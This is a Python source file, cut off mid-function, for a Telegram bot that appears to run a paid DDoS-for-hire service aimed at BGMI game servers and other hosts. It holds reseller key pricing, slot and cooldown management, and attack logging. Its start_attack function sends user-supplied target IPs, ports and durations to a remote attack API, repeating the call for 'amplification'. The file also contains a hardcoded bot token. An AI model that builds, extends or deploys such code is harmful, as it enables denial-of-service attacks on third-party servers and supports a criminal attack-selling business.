# - Complete Working Bot with Individual Cooldown & Multiple Attacks
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
import requests
import psutil
import traceback
import time
import sys
import json
import socket
import platform
from datetime import datetime, timedelta

# ============ CONFIGURATION ============
BOT_START_TIME = datetime.now()
BOT_TOKEN = "8969770002:AAG6Jz_YlO-8TB-r0yDg5mhTD5qW2m8I0EM"
BOT_OWNER = "8969770002"

# ============ FEEDBACK SYSTEM CONFIGURATION ============
# Owner ka personal bot jahan feedback jayega
OWNER_BOT_TOKEN = "8969770002:AAG6Jz_YlO-8TB-r0yDg5mhTD5qW2m8I0EM"  # 🔥 Apna owner bot token yahan paste karo
OWNER_BOT_CHAT_ID = "8969770002"  # Owner ka chat ID

# Feedback timeout (seconds)
FEEDBACK_TIMEOUT = 600  # 10 minutes = 600 seconds

# ============ FEEDBACK FORWARD TO GROUP ============
# Jahan feedback automatically forward hoga
FEEDBACK_GROUP_ID = -1002666788094  # 🔥 Apne group ka ID yahan paste karo (negative mein)
# Group mein bot ko admin banana hoga!

API_CONFIG = {
    "url": "https:////start",
    "api_key": "",
    "timeout": 30
}

# ============ PRIVATE CHANNEL VERIFICATION ============
# ============ AUTO VERIFIED SYSTEM ============
REQUIRED_CHANNEL_ID = -1002666788094
CHANNEL_INVITE_LINK = "https://t.me/+GhqSklQ2YtExZDM1"

# ============ GROUP APPROVE SYSTEM ============
approved_groups = set()
pending_group_requests = {}

# ============ API CONFIGURATION ============
DEFAULT_MAX_SLOTS = 50
MAX_SLOTS_LIMIT = 50
current_max_slots = DEFAULT_MAX_SLOTS
MIN_ATTACK_TIME = 60

# ============ RESELLER PRICING ============
RESELLER_PRICING = {
    '12h': {'price': 70, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 140, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 250, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 380, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 700, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 900, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

DEFAULT_MAX_ATTACK_TIME = 180
DEFAULT_USER_COOLDOWN = 300

# ============ IN-MEMORY STORAGE ============
DATA_DIR = "bot_data"
os.makedirs(DATA_DIR, exist_ok=True)

# ============ FILE PATHS (Constants - CAPS LOCK) ============
KEYS_FILE = os.path.join(DATA_DIR, "keys.json")
USERS_FILE = os.path.join(DATA_DIR, "users.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
ATTACK_LOGS_FILE = os.path.join(DATA_DIR, "attack_logs.json")
BOT_USERS_FILE = os.path.join(DATA_DIR, "bot_users.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")
FEEDBACK_FILE = os.path.join(DATA_DIR, "feedback.json")
APPROVED_GROUPS_FILE = os.path.join(DATA_DIR, "approved_groups.json")

# ============ IN-MEMORY DATABASES ============
keys_db = {}
users_db = {}
resellers_db = {}
attack_logs_db = []
bot_users_db = {}
bot_settings_db = {}
feedback_db = []
pending_feedback = {}
approved_groups_db = set()
# Pending attacks storage
pending_approvals = {}  # {user_id: {'target': xxx, 'port': xxx, 'duration': xxx, 'timestamp': datetime, 'message_id': xxx}}

# ============ BLOCKED PORTS ============
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030]

def is_port_blocked(port):
    """Check if port is in blocked list"""
    return port in BLOCKED_PORTS

def add_blocked_port(port):
    """Add port to blocked list"""
    if port not in BLOCKED_PORTS:
        BLOCKED_PORTS.append(port)
        return True
    return False

def remove_blocked_port(port):
    """Remove port from blocked list"""
    if port in BLOCKED_PORTS:
        BLOCKED_PORTS.remove(port)
        return True
    return False

def get_blocked_ports():
    """Return list of blocked ports"""
    return BLOCKED_PORTS.copy()

def user_sent_feedback(user_id):
    """User ne feedback bheja - mark as received"""
    if user_id in pending_approvals:
        pending_approvals[user_id]['feedback_received'] = True
        return True
    return False
    
# ============ JSON FUNCTIONS ============
def load_json(file_path, default=None):
    if default is None:
        default = {}
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=2, default=str)

# ============ DATA ACCESS FUNCTIONS ============

# Verified users file
VERIFIED_FILE = os.path.join(DATA_DIR, "verified.json")
# ============ VIDEO CONFIG (AUTO SAVE SYSTEM) ============
VIDEO_CONFIG_FILE = os.path.join(DATA_DIR, "video_config.json")

def load_video_id():
    """Saved video ID load karo"""
    if os.path.exists(VIDEO_CONFIG_FILE):
        try:
            with open(VIDEO_CONFIG_FILE, 'r') as f:
                data = json.load(f)
                video_id = data.get('video_id')
                if video_id:
                    return video_id
        except:
            pass
    # Default video ID (agar koi save nahi hai)
    return "BAACAgUAAxkBAAIue2njO9yKQbmGR6SFtEmYOHtf8FshAAK5HgAC7ooZV-wn0J-QgKIQOwQ"

def save_video_id(video_id):
    """Video ID save karo"""
    with open(VIDEO_CONFIG_FILE, 'w') as f:
        json.dump({'video_id': video_id}, f)
    print(f"✅ Video ID saved: {video_id}")
    
def load_verified_users():
    if os.path.exists(VERIFIED_FILE):
        try:
            with open(VERIFIED_FILE, 'r') as f:
                return set(json.load(f))
        except:
            return set()
    return set()

def save_verified_users(verified_set):
    with open(VERIFIED_FILE, 'w') as f:
        json.dump(list(verified_set), f)

verified_users = load_verified_users()

def is_user_joined_channel(user_id):
    """Check if user has joined the channel"""
    try:
        chat_member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        status = chat_member.status
        if status in ['creator', 'administrator', 'member', 'restricted']:
            return True
        return False
    except:
        return False

def auto_verify_user(user_id):
    """Auto verify user if joined channel"""
    if is_user_joined_channel(user_id):
        if user_id not in verified_users and not is_owner(user_id):
            verified_users.add(user_id)
            save_verified_users(verified_users)
            return True
    return False

def check_channel_and_continue(message):
    """Auto verify + check"""
    user_id = message.from_user.id
    
    if is_owner(user_id):
        return True
    
    # Auto verify if joined channel
    auto_verify_user(user_id)
    
    if user_id in verified_users:
        return True
    
    safe_send_message(message.chat.id, 
        f"❌ **Join Channel First!**\n\n"
        f"Please join our private channel to use this bot.\n\n"
        f"🔗 **Join Link:** {CHANNEL_INVITE_LINK}\n\n"
        f"✅ After joining, send /start again to get auto-verified.",
        reply_to=message, parse_mode="Markdown")
    return False

# ============ FEEDBACK SYSTEM FUNCTIONS ============

# Feedback timeout settings
FEEDBACK_USER_TIMEOUT = 180  # 3 minutes = 180 seconds (user se feedback lene ke liye)
FEEDBACK_OWNER_TIMEOUT = 300  # 5 minutes = 300 seconds (owner approval ke liye)
    
def get_keys():
    return load_json(KEYS_FILE, {})

def save_keys(keys):
    save_json(KEYS_FILE, keys)

def get_users():
    return load_json(USERS_FILE, {})

def save_users(users):
    save_json(USERS_FILE, users)

def get_resellers():
    return load_json(RESELLERS_FILE, {})

def save_resellers(resellers):
    save_json(RESELLERS_FILE, resellers)

def get_attack_logs():
    return load_json(ATTACK_LOGS_FILE, [])

def save_attack_logs(logs):
    save_json(ATTACK_LOGS_FILE, logs)

def get_bot_users():
    return load_json(BOT_USERS_FILE, {})

def save_bot_users(users):
    save_json(BOT_USERS_FILE, users)

def get_settings():
    return load_json(SETTINGS_FILE, {})

def save_settings(settings):
    save_json(SETTINGS_FILE, settings)
    
    
# ============ LOAD ALL DATA FUNCTION ============
def load_all_data():
    global keys_db, users_db, resellers_db, attack_logs_db, bot_users_db, bot_settings_db, feedback_db
    
    keys_db = get_keys()
    users_db = get_users()
    resellers_db = get_resellers()
    attack_logs_db = get_attack_logs()
    bot_users_db = get_bot_users()
    bot_settings_db = get_settings()
    
    print(f"📂 Loaded: {len(users_db)} users, {len(keys_db)} keys, {len(resellers_db)} resellers")

# ============ SETTINGS FUNCTIONS ============

# Two separate cooldown dictionaries
user_start_cooldowns = {}
user_end_cooldowns = {}

def user_feedback_timer(user_id, username, target, port, duration, user_message_id):
    """3 minute wait for user feedback, then notify user, group, and owner"""
    time.sleep(FEEDBACK_USER_TIMEOUT)  # 3 minutes = 180 seconds
    
    # Check if user already sent feedback
    if user_id in pending_approvals and pending_approvals[user_id].get('status') == 'pending':
        if pending_approvals[user_id].get('feedback_received'):
            # Feedback already received, no need to notify
            return
        
        # Send reminder to user
        try:
            bot.send_message(user_id, 
                "⏰ **3 minutes passed!**\n\n"
                "You didn't send feedback.\n"
                "Please send screenshot as soon as possible.\n\n"
                "⚠️ Your next attack will be allowed only after feedback!")
        except:
            pass
        
        # Send notification to GROUP with user tag
        try:
            user_mention = f"[{username}](tg://user?id={user_id})"
            
            group_msg = f"""
⚠️ **FEEDBACK REMINDER**

👤 **User:** {user_mention}
🆔 **ID:** `{user_id}`
🎯 **Target:** `{target}:{port}`
⏱️ **Duration:** `{duration}s`

⏰ **3 minutes have passed! User has not sent feedback yet.**

📸 Please send a screenshot as soon as possible.
"""
            if FEEDBACK_GROUP_ID:
                bot.send_message(FEEDBACK_GROUP_ID, group_msg, parse_mode="Markdown")
        except Exception as e:
            print(f"Error sending reminder to group: {e}")
        
        # Notify owner
        send_feedback_to_owner(user_id, username, target, port, duration, user_message_id)
            
def load_approved_groups():
    global approved_groups
    if os.path.exists(APPROVED_GROUPS_FILE):
        try:
            data = load_json(APPROVED_GROUPS_FILE, [])
            approved_groups = set(data)
        except:
            approved_groups = set()
    else:
        approved_groups = set()

def save_approved_groups():
    save_json(APPROVED_GROUPS_FILE, list(approved_groups))

def is_group_approved(chat_id):
    """Check if group is approved for attacks"""
    return chat_id in approved_groups

def is_private_chat(message):
    """Check if message is from private chat (DM)"""
    return message.chat.type == "private"

def is_group_chat(message):
    """Check if message is from group/supergroup"""
    return message.chat.type in ["group", "supergroup"]

def check_channel_and_continue(message):
    """Universal channel check"""
    user_id = message.from_user.id
    if is_owner(user_id):
        return True
    if is_user_joined_channel(user_id):
        return True
    
    safe_send_message(message.chat.id, 
        f"❌ **Join Channel First!**\n\n"
        f"Please join our private channel to use this bot.\n\n"
        f"🔗 **Join Link:** {CHANNEL_INVITE_LINK}\n\n"
        f"⚠️ After joining, click /start again to verify.\n\n"
        f"📢 **Note:** This is a private channel. You need to join manually.", 
        reply_to=message, parse_mode="Markdown")
    return False

def can_attack_in_chat(message):
    """Check if user can attack in this chat"""
    user_id = message.from_user.id
    
    # Owner can attack anywhere
    if is_owner(user_id):
        return True, ""
    
    # Private chat - need valid key
    if is_private_chat(message):
        if has_valid_key(user_id):
            return True, ""
        else:
            return False, "❌ You need a valid key to attack in private chat!\n\nUse /redeem <key> to activate."
    
    # Group chat - no key needed, just group should be approved
    if is_group_chat(message):
        if is_group_approved(message.chat.id):
            return True, ""
        else:
            return False, "❌ This group is not approved for attacks!"
    
    return False, "❌ Cannot attack here!"

def get_setting(key, default):
    settings = get_settings()
    return settings.get(key, default)

def set_setting(key, value):
    settings = get_settings()
    settings[key] = value
    save_settings(settings)
    
def load_max_slots():
    global current_max_slots
    saved_slots = get_setting('max_concurrent_slots', DEFAULT_MAX_SLOTS)
    current_max_slots = saved_slots
    print(f"📊 Loaded max slots: {current_max_slots}")

def update_max_slots(new_slots):
    global current_max_slots
    if new_slots < 1 or new_slots > MAX_SLOTS_LIMIT:
        return False
    current_max_slots = new_slots
    set_setting('max_concurrent_slots', new_slots)
    return True

load_max_slots()

def update_reseller_pricing():
    for dur in RESELLER_PRICING:
        saved_price = get_setting(f'price_{dur}', None)
        if saved_price is not None:
            RESELLER_PRICING[dur]['price'] = saved_price

update_reseller_pricing()

# ============ BOT INITIALIZATION ============
bot = telebot.TeleBot(BOT_TOKEN)

# ============ HELPER FUNCTIONS ============
def send_feedback_to_owner(user_id, username, target, port, duration, user_message_id):
    """Owner ko feedback request bhejo ( jab user 3 min mein feedback na de)"""
    message = f"""
🔔 **URGENT: FEEDBACK REQUIRED FROM USER!**

👤 **User:** {username}
🆔 **ID:** `{user_id}`
🎯 **Target:** `{target}:{port}`
⏱️ **Duration:** `{duration}s`
🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️ User has NOT sent feedback within 3 minutes!
Please ask user to send screenshot.

⏳ Auto-approve in 5 minutes if no action taken.
"""
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
        InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
    )
    
    try:
        owner_bot = telebot.TeleBot(OWNER_BOT_TOKEN)
        owner_bot.send_message(OWNER_BOT_CHAT_ID, message, parse_mode="Markdown", reply_markup=markup)
        
        # Update pending approval with owner message ID
        if user_id in pending_approvals:
            pending_approvals[user_id]['owner_message_id'] = sent_msg.message_id
            pending_approvals[user_id]['status'] = 'pending'
        
        # Start auto-approve timer (5 minutes)
        threading.Thread(target=auto_approve_timer, args=(user_id,), daemon=True).start()
        return True
    except Exception as e:
        print(f"Error sending to owner bot: {e}")
        return False
        
def auto_approve_timer(user_id):
    """5 minute baad auto-approve"""
    time.sleep(FEEDBACK_OWNER_TIMEOUT)  # 5 minutes = 300 seconds
    
    if user_id in pending_approvals and pending_approvals[user_id].get('status') == 'pending':
        pending_approvals[user_id]['status'] = 'auto_approved'
        
        # Notify group
        pending = pending_approvals.get(user_id, {})
        if FEEDBACK_GROUP_ID:
            try:
                group_msg = f"""
⏰ **AUTO-APPROVED!** (5 minutes timeout)

👤 **User:** {pending.get('username', 'Unknown')}
🆔 **ID:** `{user_id}`
🎯 **Target:** `{pending.get('target', 'N/A')}:{pending.get('port', 'N/A')}`
⏱️ **Duration:** `{pending.get('duration', 'N/A')}s`

✅ Attack has been auto-approved!
User can now start another attack.
"""
                bot.send_message(FEEDBACK_GROUP_ID, group_msg, parse_mode="Markdown")
            except:
                pass
        
        # Notify owner
        try:
            owner_bot = telebot.TeleBot(OWNER_BOT_TOKEN)
            owner_bot.send_message(OWNER_BOT_CHAT_ID, 
                f"⏰ **Auto-Approved!**\n\nUser `{user_id}` attack has been auto-approved (5 minutes timeout).")
        except:
            pass
        
        # Notify user
        try:
            bot.send_message(user_id, 
                "✅ **Auto-Approved!**\n\n"
                "Your attack has been auto-approved after 5 minutes.\n"
                "You can now start another attack!")
        except:
            pass
            
def safe_send_message(chat_id, text, reply_to=None, parse_mode=None):
    try:
        if reply_to:
            try:
                return bot.reply_to(reply_to, text, parse_mode=parse_mode)
            except Exception as e:
                return bot.send_message(chat_id, text, parse_mode=None)
        else:
            return bot.send_message(chat_id, text, parse_mode=None)
    except Exception as e:
        return None

# ============ HELPER FUNCTIONS ============

def get_slot_status():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        
        busy_slots = len(api_in_use)
        free_slots = current_max_slots - busy_slots
        return busy_slots, free_slots, current_max_slots

def set_user_cooldown_start(user_id):
    cooldown_time = 180
    user_start_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time)
    return cooldown_time

def set_user_cooldown_end(user_id):
    cooldown_time = get_user_cooldown_setting()
    user_end_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time)
    return cooldown_time

def get_user_cooldown(user_id):
    # Check both cooldowns
    start_remaining = 0
    end_remaining = 0
    
    if user_id in user_start_cooldowns:
        remaining = (user_start_cooldowns[user_id] - datetime.now()).total_seconds()
        if remaining > 0:
            start_remaining = int(remaining)
        else:
            del user_start_cooldowns[user_id]
    
    if user_id in user_end_cooldowns:
        remaining = (user_end_cooldowns[user_id] - datetime.now()).total_seconds()
        if remaining > 0:
            end_remaining = int(remaining)
        else:
            del user_end_cooldowns[user_id]
    
    # Return the larger cooldown
    return max(start_remaining, end_remaining)

def get_max_attack_time():
    try:
        return int(get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME))
    except:
        return DEFAULT_MAX_ATTACK_TIME

def get_user_cooldown_setting():
    try:
        return int(get_setting('user_cooldown', DEFAULT_USER_COOLDOWN))
    except:
        return DEFAULT_USER_COOLDOWN

def get_concurrent_limit():
    try:
        return int(get_setting('_cx_th', 1))
    except:
        return 1

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot is in maintenance mode. Please try again later.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def get_blocked_ips():
    return get_setting('blocked_ips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

def check_maintenance(message):
    if is_maintenance() and message.from_user.id != BOT_OWNER:
        safe_send_message(message.chat.id, get_maintenance_msg(), reply_to=message)
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return False
    
    user = users_db.get(user_id)
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_db[user_id]['banned'] = False
                users_db[user_id].pop('ban_expiry', None)
                users_db[user_id].pop('ban_type', None)
                save_users(users_db)
                return False
            
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            safe_send_message(message.chat.id, f"🚫 YOU HAVE BEEN TEMPORARILY BANNED!\n\n⏳ Expiry: {expiry_str}\n❌ You cannot do anything.\n\n📞 Contact Owner and Your Seller @DAEMON_OWNER", reply_to=message)
            return True
        
        safe_send_message(message.chat.id, f"🚫 YOU HAVE BEEN PERMANENTLY BANNED!\n\n❌ You cannot do anything.\n\n📞 Contact Owner and Your Seller @DAEMON_OWNER", reply_to=message)
        return True
    return False

def approve_attack(user_id):
    """User ka attack approve karo"""
    if user_id in pending_approvals:
        pending_approvals[user_id]['status'] = 'approved'
        # Clear pending feedback
        if user_id in pending_feedback:
            del pending_feedback[user_id]
        return True
    return False

def reject_attack(user_id):
    """User ka attack reject karo"""
    if user_id in pending_approvals:
        pending_approvals[user_id]['status'] = 'rejected'
        return True
    return False
    
def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                for uid, user in users_db.items():
                    if user.get('key_expiry') and user['key_expiry'] > now:
                        user['key_expiry'] += timedelta(minutes=1)
                save_users(users_db)
            time.sleep(60)
        except:
            time.sleep(10)

extender_thread = threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        return len(active_attacks)

def get_free_api_index():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        
        busy_indices = set(api_in_use.values())
        for i in range(current_max_slots):
            if i not in busy_indices:
                return i
        return None

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def set_pending_feedback(user_id, target, port, duration):
    pending_feedback[user_id] = {
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    }

def get_pending_feedback(user_id):
    return pending_feedback.get(user_id)

def clear_pending_feedback(user_id):
    if user_id in pending_feedback:
        del pending_feedback[user_id]

def has_pending_feedback(user_id):
    return user_id in pending_feedback
    
def log_attack(user_id, username, target, port, duration):
    attack_logs_db.append({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })
    save_attack_logs(attack_logs_db)

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    reseller = resellers_db.get(user_id)
    return reseller is not None and not reseller.get('blocked')

def get_reseller(user_id):
    return resellers_db.get(user_id)

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    
    for uid, user in users_db.items():
        if user.get('username') and user['username'].lower() == input_str.lower():
            return uid, user.get('username')
    
    for uid, reseller in resellers_db.items():
        if reseller.get('username') and reseller['username'].lower() == input_str.lower():
            return uid, reseller.get('username')
    
    for uid, bot_user in bot_users_db.items():
        if bot_user.get('username') and bot_user['username'].lower() == input_str.lower():
            return uid, bot_user.get('username')
    
    return None, None

def has_valid_key(user_id):
    user = users_db.get(user_id)
    
    if not user or not user.get('key_expiry'):
        return False
    
    if datetime.now() > user['key_expiry']:
        users_db[user_id]['key'] = None
        users_db[user_id]['key_expiry'] = None
        save_users(users_db)
        return False
    
    return True

def get_time_remaining(user_id):
    user = users_db.get(user_id)
    
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{days}d {hours}h {minutes}m {seconds}s"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def send_long_message(message, text, parse_mode=None):
    max_length = 4000
    if len(text) <= max_length:
        try:
            safe_send_message(message.chat.id, text, reply_to=message, parse_mode=None)
        except:
            pass
    else:
        parts = []
        current_part = ""
        lines = text.split('\n')
        for line in lines:
            if len(current_part) + len(line) + 1 > max_length:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        if current_part:
            parts.append(current_part)
        for i, part in enumerate(parts):
            try:
                if i == 0:
                    safe_send_message(message.chat.id, part, reply_to=message, parse_mode=None)
                else:
                    bot.send_message(message.chat.id, part)
                time.sleep(0.3)
            except:
                pass

def track_bot_user(user_id, username=None, first_name=None):
    try:
        bot_users_db[user_id] = {
            'user_id': user_id,
            'username': username,
            'first_name': first_name,
            'last_seen': datetime.now(),
            'first_seen': bot_users_db.get(user_id, {}).get('first_seen', datetime.now())
        }
        save_bot_users(bot_users_db)
    except:
        pass

def require_channel(func):
    """Decorator to check channel join before executing command"""
    def wrapper(message):
        user_id = message.from_user.id
        
        # Owner ko channel join ki zaroorat nahi
        if is_owner(user_id):
            return func(message)
        
        # Check if user joined channel
        if not is_user_joined_channel(user_id):
            safe_send_message(message.chat.id, 
                f"❌ **Access Denied!**\n\n"
                f"You must join our channel first to use this bot.\n\n"
                f"📢 **Join Channel:** {REQUIRED_CHANNEL}\n"
                f"🔗 **Link:** {CHANNEL_LINK}\n\n"
                f"⚠️ After joining, click /start again to verify.",
                reply_to=message, parse_mode="Markdown")
            return
        
        return func(message)
    return wrapper
    
def build_global_status_message(user_id):
    """Show ALL active attacks from ALL users"""
    busy_slots, free_slots, total_slots = get_slot_status()
    is_owner_user = is_owner(user_id)
    
    response = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += "🔥 *BGMI DDOS ATTACK STATUS* 🔥\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    if active_attacks:
        response += f"📊 Active Attacks: {len(active_attacks)}/{total_slots}\n"
        response += "────────────────────────────────────\n\n"
        
        for attack_id, attack in active_attacks.items():
            remaining = int((attack['end_time'] - datetime.now()).total_seconds())
            if remaining > 0:
                total = attack['duration']
                elapsed = total - remaining
                progress = int((elapsed / total) * 100)
                
                # Progress bar
                bar_length = 20
                filled = int(bar_length * progress / 100)
                bar = '🟢' * filled + '⚫' * (bar_length - filled)
                
                # Get attacker info
                attacker_id = attack.get('user_id')
                attacker_data = users_db.get(attacker_id, {})
                attacker_name = attacker_data.get('username', f"User_{attacker_id}")
                if len(attacker_name) > 15:
                    attacker_name = attacker_name[:12] + "..."
                
                response += f"🎯 Target: {attack['target']}:{attack['port']}\n"
                response += f"⏱️ Time Left: {remaining}s • {progress}%\n"
                response += f"📊 {bar}\n"
                
                if is_owner_user:
                    response += f"👤 Attacker: {attacker_name} ({attacker_id})\n"
                else:
                    response += f"👤 Attacker: {attacker_name}\n"
                response += "────────────────────────────────────\n"
    else:
        response += "💤 *No active attacks running*\n"
        response += "────────────────────────────────────\n"
    
    response += f"🟢 Free Slots: {free_slots}/{total_slots}\n"
    response += f"🔴 Used Slots: {busy_slots}/{total_slots}\n\n"
    response += f"⚙️ Attack Amplification: {get_concurrent_limit()}x\n"
    response += f"⏰ Max Attack Time: {get_max_attack_time()}s\n"
    response += f"⏳ Cooldown: {get_user_cooldown_setting()}s\n"
    
    # Check user's own status
    if user_has_active_attack(user_id):
        response += "\n✅ Your attack is in progress!"
    elif get_user_cooldown(user_id) > 0:
        response += f"\n⏳ Your cooldown: {get_user_cooldown(user_id)}s Agar isase jyada Attack Time Chahie Toh Paid Wala Buy Karo Cooldown Low And More Powerfull Cheap Price Hai - @DAEMON_OWNER"
    
    response += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    return response

def update_status_loop(chat_id, message_id, user_id):
    try:
        update_count = 0
        while update_count < 30:
            time.sleep(2)
            if not user_has_active_attack(user_id) and get_user_cooldown(user_id) == 0:
                break
                
            new_response = build_global_status_message(user_id)
            try:
                bot.edit_message_text(new_response, chat_id=chat_id, message_id=message_id)
                update_count += 1
            except:
                break
    except:
        pass
        
def start_attack(target, port, duration, message, attack_id, api_index):
    try:
        user_id = message.from_user.id
        username = message.from_user.first_name or message.from_user.username or str(user_id)
        
        log_attack(user_id, username, target, port, duration)
        start_cooldown = set_user_cooldown_start(user_id)
        
        # ============ SEND VIDEO WITH FULL MESSAGE IN CAPTION ============
        try:
            VIDEO_FILE_ID = load_video_id()  # ✅ AUTO LOAD FROM SAVED
            
            caption_text = f"""✨ **Attack Started!** ✨

🎯 **Target:** `{target}:{port}`
⏱️ **Duration:** `{duration}s`
👤 **User:** {username}

📊 **Monitor:** Type /status to see live progress"""
            
            bot.send_video(
                message.chat.id, 
                VIDEO_FILE_ID, 
                caption=caption_text,
                reply_to_message_id=message.message_id,
                parse_mode="Markdown"
            )
            print("✅ Video sent with message!")
        except Exception as video_err:
            print(f"Video error: {video_err}")
            safe_send_message(message.chat.id, caption_text, reply_to=message, parse_mode="Markdown")
        
        # ============ ✅ YEH API CALL ADD KARO ============
        concurrent_limit = get_concurrent_limit()
        success_count = 0
        for i in range(concurrent_limit):
            try:
                params = {
                    "key": API_CONFIG['api_key'],
                    "target": target,
                    "port": int(port),
                    "time": int(duration),
                    "method": "000",
                    "concurrent": 1
                }
                r = requests.get(API_CONFIG['url'], params=params, timeout=30)
                print(f"API Response {i+1}: Status {r.status_code}")
                print(f"Response Text: {r.text[:200]}")
                
                if r.status_code == 200:
                    data = r.json()
                    if data.get('success'):
                        success_count += 1
                        print(f"✅ Attack {i+1} started! ID: {data.get('data', {}).get('id')}")
                    else:
                        print(f"❌ Attack failed: {data.get('message')}")
                else:
                    print(f"❌ HTTP Error: {r.status_code}")
            except Exception as e:
                print(f"API Error: {e}")
            time.sleep(0.5)
        
        print(f"📊 Attack result: {success_count}/{concurrent_limit} successful")
        # =======================================================
        
        time.sleep(duration)
        
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        
        end_cooldown = set_user_cooldown_end(user_id)
        
        pending_approvals[user_id] = {
            'target': target, 'port': port, 'duration': duration,
            'username': username, 'user_message_id': message.message_id,
            'timestamp': datetime.now(), 'status': 'pending', 'feedback_received': False
        }
        
        # Attack complete message
        complete_msg = f"""✅ **Attack Complete!** ✅

🎯 **Target:** `{target}:{port}`
⏱️ **Duration:** `{duration}s`
⏳ **Cooldown:** `{end_cooldown}s`

📸 **Send screenshot as feedback!**"""
        
        safe_send_message(message.chat.id, complete_msg, reply_to=message, parse_mode="Markdown")
        
        threading.Thread(target=user_feedback_timer, args=(user_id, username, target, port, duration, message.message_id), daemon=True).start()
        
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
